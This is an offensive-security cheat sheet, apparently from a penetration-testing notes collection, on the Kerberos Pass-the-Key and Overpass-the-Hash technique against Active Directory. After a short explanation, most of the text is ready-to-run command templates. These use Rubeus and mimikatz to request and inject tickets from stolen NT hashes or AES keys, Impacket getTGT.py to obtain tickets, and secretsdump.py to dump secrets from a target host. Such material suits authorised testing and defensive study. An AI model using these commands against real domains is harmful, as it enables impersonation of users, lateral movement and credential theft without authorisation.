---
technique: Pass the Key
category: kerberos
targets: Domain users
protocols: Kerberos
remote_capable: true
tags: kerberos pass-the-key ptk overpass-the-hash aes rc4 tgt ad
---

# Pass the Key

Kerberos pre-authentication accepts any of the four key types: DES, RC4, AES-128, or AES-256. When an attacker knows any of these keys (but not necessarily the plaintext password), they can use it directly to obtain a TGT. When the RC4 key (which equals the NT hash) is used, this is also called Overpass-the-Hash. When AES keys are used (typically when RC4 is disabled), it is called Pass-the-Key proper.

## Windows

### Rubeus (RC4)

#powershell #tgt #rc4

Request a TGT using an NT hash (RC4 key) and inject it into the session.

```powershell title:"Request TGT with NT hash via Rubeus"
.\Rubeus.exe asktgt /domain:"$domain" /user:"$user" /rc4:"$nt_hash" /ptt
```
<!-- cheat
import domain_ip
import users
var nt_hash
-->

### Rubeus (AES-128)

#powershell #tgt #aes

Request a TGT using an AES-128 key and inject it into the session.

```powershell title:"Request TGT with AES-128 key via Rubeus"
.\Rubeus.exe asktgt /domain:"$domain" /user:"$user" /aes128:"$aes128_key" /ptt
```
<!-- cheat
import domain_ip
import users
var aes128_key
-->

### Rubeus (AES-256)

#powershell #tgt #aes

Request a TGT using an AES-256 key and inject it into the session.

```powershell title:"Request TGT with AES-256 key via Rubeus"
.\Rubeus.exe asktgt /domain:"$domain" /user:"$user" /aes256:"$aes256_key" /ptt
```
<!-- cheat
import domain_ip
import users
var aes256_key
-->

### mimikatz sekurlsa::pth

#c #rc4 #aes #spawn-process

Spawn a new process with a stolen Kerberos key using mimikatz sekurlsa::pth.

```cmd title:"Spawn process with Kerberos key via mimikatz sekurlsa::pth"
sekurlsa::pth /user:$user /domain:$domain /rc4:$nt_hash /ptt
```
<!-- cheat
import domain_ip
import users
var nt_hash
-->

## Linux

### getTGT.py (NT hash)

#impacket #tgt #rc4

Request a TGT using an NT hash; the resulting `.ccache` file can be used for pass-the-ticket.

```sh title:"Request TGT with NT hash via getTGT.py"
getTGT.py -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user"
```
<!-- cheat
import domain_ip
import users
var nt_hash
-->

### getTGT.py (AES key)

#impacket #tgt #aes

Request a TGT using an AES key; the resulting `.ccache` file can be used for pass-the-ticket.

```sh title:"Request TGT with AES key via getTGT.py"
getTGT.py -aesKey "$aes_key" "$domain/$user"
```
<!-- cheat
import domain_ip
import users
var aes_key
-->

### secretsdump (inline key)

#impacket #credential-dumping #pth

Use an NT hash inline with Impacket's `-k` flag for direct tool invocation without a separate TGT step.

```sh title:"Dump secrets using NT hash inline with Impacket -k"
secretsdump.py -k -hashes "aad3b435b51404eeaad3b435b51404ee:$nt_hash" "$domain/$user@$target"
```
<!-- cheat
import domain_ip
import users
var nt_hash
var target
-->
